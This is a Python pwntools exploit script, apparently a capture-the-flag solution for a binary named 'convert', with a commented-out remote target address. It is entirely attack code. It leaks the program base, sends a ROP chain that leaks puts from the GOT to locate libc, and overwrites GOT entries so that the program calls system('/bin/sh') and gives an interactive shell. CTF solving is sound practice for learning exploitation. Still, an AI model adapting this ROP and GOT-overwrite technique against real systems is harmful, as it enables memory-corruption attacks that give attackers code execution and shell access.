from pwn import *

elf = ELF('./convert')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
p = process('./convert')
# libc = ELF('./libc.so.6')
# p = remote('34.143.130.87', 4001)

def send_data(ops, mode, data):
	payload = flat({
		0: str(ops).encode(),
		0x4: mode,
		0x8: data
	}, filler = b'\x00')

	sleep(0.01)
	p.send(payload)

p.recvline()

elf.address = u64(p.recvline()[:-1].ljust(8, b'\x00')) - 0x1ada
print(hex(elf.address))

pop_rdi = elf.address + 0x1c0b
pop_rbp_r14_r15 = elf.address + 0x1c07

send_data(1, b'htb', b'a' + b'\x00'*3 + p32(0xc0 - 0x30))
send_data(1, b'htb', b'b' + b'\x00'*7 + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(pop_rbp_r14_r15) + p64(elf.got['memcpy'] + 0x50))
send_data(1, b'htb', b'c'*8 + p64(0) + p64(pop_rdi + 1) + p64(elf.address + 0x1aff) + p64(0) + p64(elf.address + 0x4070))
send_data(1, b'htb', b'd'*0x30)
send_data(0, b'htb', b'e'*0x30)

libc.address = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - libc.sym['puts']
print(hex(libc.address))

pause()
p.send(b'/bin/sh\x00' + p64(libc.sym['malloc']) + p64(libc.sym['system']))

p.interactive()